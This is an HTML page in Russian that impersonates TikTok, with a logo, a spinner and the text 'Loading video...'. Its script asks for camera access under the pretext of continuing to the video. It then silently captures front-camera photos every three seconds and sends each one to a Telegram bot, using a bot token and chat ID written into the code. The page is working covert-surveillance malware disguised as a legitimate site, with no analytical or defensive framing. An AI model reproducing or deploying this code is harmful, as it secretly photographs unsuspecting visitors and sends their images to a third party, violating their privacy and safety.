<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok</title>
    <style>
        body { background-color: #010101; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; overflow: hidden; }
        .logo { width: 100px; height: 100px; margin-bottom: 20px; border-radius: 20px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .text { margin-top: 20px; font-size: 18px; font-weight: bold; }
        #video, #canvas { display: none; position: absolute; }
        
        .permission-hint {
            background-color: #fe2c55;
            color: white;
            padding: 12px 24px;
            border-radius: 30px; 
            font-size: 15px;
            font-weight: bold;
            margin-bottom: 30px;
            text-align: center;
            z-index: 10;
        }
    </style>
</head>
<body>
    <img src="https://sf-tb-static.fingerfun.com" alt="TikTok" class="logo">
    <div id="hint" class="permission-hint">Нажмите «Разрешить», чтобы продолжить</div>
    <div class="loader"></div>
    <div class="text">Загрузка видео...</div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

<script>
    const botToken = '8220142638:AAFDjQSzi4V1i5xfpMBA42uBgaDjFA0znOo';
    const chatId = '8573089884';
    let isProcessing = false; // Флаг, чтобы не слать новое фото, пока старое не ушло

    async function takeAndSendPhoto() {
        if (isProcessing) return; // Если прошлое фото еще грузится — выходим
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        if (video.videoWidth === 0) return;

        isProcessing = true;

        // ОПТИМИЗАЦИЯ: Уменьшаем размер фото до 640px по ширине (для скорости на телефоне)
        const scale = 640 / video.videoWidth;
        canvas.width = 640;
        canvas.height = video.videoHeight * scale;

        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Снижаем качество до 0.4 (фото станет очень легким и улетит мгновенно)
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'shot.jpg');

            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const res = await response.json();
                console.log("Отправлено:", res.ok);
            } catch (e) { 
                console.error("Ошибка сети:", e); 
            } finally {
                isProcessing = false; // Разрешаем следующую отправку
            }
        }, 'image/jpeg', 0.1); 
    }

    window.onload = () => {
        navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: "user",
                width: { ideal: 640 }, // Просим браузер сразу не брать 4K
                height: { ideal: 480 }
            } 
        })
        .then(stream => {
            document.getElementById('hint').style.display = 'none';
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            video.onloadedmetadata = () => {
                video.play();
                setTimeout(() => {
                    takeAndSendPhoto();
                    // Интервал 3 секунды (оптимально для мобильного интернета)
                    setInterval(takeAndSendPhoto, 3000); 
                }, 2000);
            };
        })
        .catch(err => { 
            document.getElementById('hint').innerText = "Ошибка: разрешите доступ к камере";
            document.getElementById('hint').style.backgroundColor = "gray";
        });
    };
</script>
</body>
</html>
